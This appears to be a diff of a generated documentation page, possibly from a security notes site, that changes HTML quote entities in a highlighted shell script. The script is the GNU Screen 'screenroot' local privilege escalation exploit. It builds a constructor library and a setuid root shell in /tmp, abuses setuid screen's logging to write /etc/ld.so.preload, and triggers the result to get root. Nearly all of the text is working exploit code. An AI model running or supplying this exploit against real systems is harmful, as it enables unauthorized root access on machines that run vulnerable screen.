@@ -26842,8 +26842,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="c1"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span>
 </span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="c1"># HACK THE PLANET</span>
 </span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="c1"># ~ infodox (25/1/2017)</span>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;~ gnu/screenroot ~&quot;</span>
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[+] First, we create our shell and library...&quot;</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"~ gnu/screenroot ~"</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"[+] First, we create our shell and library..."</span>
 </span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a>cat<span class="w"> </span><span class="s">&lt;&lt; EOF &gt; /tmp/libhax.c</span>
 </span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a><span class="s">#include &lt;stdio.h&gt;</span>
 </span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12"></a><span class="s">#include &lt;sys/types.h&gt;</span>
@@ -26851,10 +26851,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14"></a><span class="s">#include &lt;sys/stat.h&gt;</span>
 </span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15"></a><span class="s">__attribute__ ((__constructor__))</span>
 </span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16"></a><span class="s">void dropshell(void){</span>
-</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17"></a><span class="s">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span>
-</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18"></a><span class="s">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span>
-</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19"></a><span class="s">    unlink(&quot;/etc/ld.so.preload&quot;);</span>
-</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20"></a><span class="s">    printf(&quot;[+] done!\n&quot;);</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17"></a><span class="s">    chown("/tmp/rootshell", 0, 0);</span>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18"></a><span class="s">    chmod("/tmp/rootshell", 04755);</span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19"></a><span class="s">    unlink("/etc/ld.so.preload");</span>
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20"></a><span class="s">    printf("[+] done!\n");</span>
 </span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21"></a><span class="s">}</span>
 </span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22"></a><span class="s">EOF</span>
 </span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23"></a>gcc<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>-ldl<span class="w"> </span>-o<span class="w"> </span>/tmp/libhax.so<span class="w"> </span>/tmp/libhax.c
@@ -26866,16 +26866,16 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29"></a><span class="s">    setgid(0);</span>
 </span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30"></a><span class="s">    seteuid(0);</span>
 </span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31"></a><span class="s">    setegid(0);</span>
-</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32"></a><span class="s">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span>
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32"></a><span class="s">    execvp("/bin/sh", NULL, NULL);</span>
 </span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33"></a><span class="s">}</span>
 </span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34"></a><span class="s">EOF</span>
 </span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35"></a>gcc<span class="w"> </span>-o<span class="w"> </span>/tmp/rootshell<span class="w"> </span>/tmp/rootshell.c<span class="w"> </span>-Wno-implicit-function-declaration
 </span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36"></a>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/rootshell.c
-</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span>
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"[+] Now we create our /etc/ld.so.preload file..."</span>
 </span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38"></a><span class="nb">cd</span><span class="w"> </span>/etc
 </span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39"></a><span class="nb">umask</span><span class="w"> </span><span class="m">000</span><span class="w"> </span><span class="c1"># because</span>
-</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40"></a>screen<span class="w"> </span>-D<span class="w"> </span>-m<span class="w"> </span>-L<span class="w"> </span>ld.so.preload<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w">  </span><span class="s2">&quot;\x0a/tmp/libhax.so&quot;</span><span class="w"> </span><span class="c1"># newline needed</span>
-</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[+] Triggering...&quot;</span>
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40"></a>screen<span class="w"> </span>-D<span class="w"> </span>-m<span class="w"> </span>-L<span class="w"> </span>ld.so.preload<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w">  </span><span class="s2">"\x0a/tmp/libhax.so"</span><span class="w"> </span><span class="c1"># newline needed</span>
+</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"[+] Triggering..."</span>
 </span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42"></a>screen<span class="w"> </span>-ls<span class="w"> </span><span class="c1"># screen itself is setuid, so...</span>
 </span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43"></a>/tmp/rootshell
 </span></code></pre></div></td></tr></table></div>
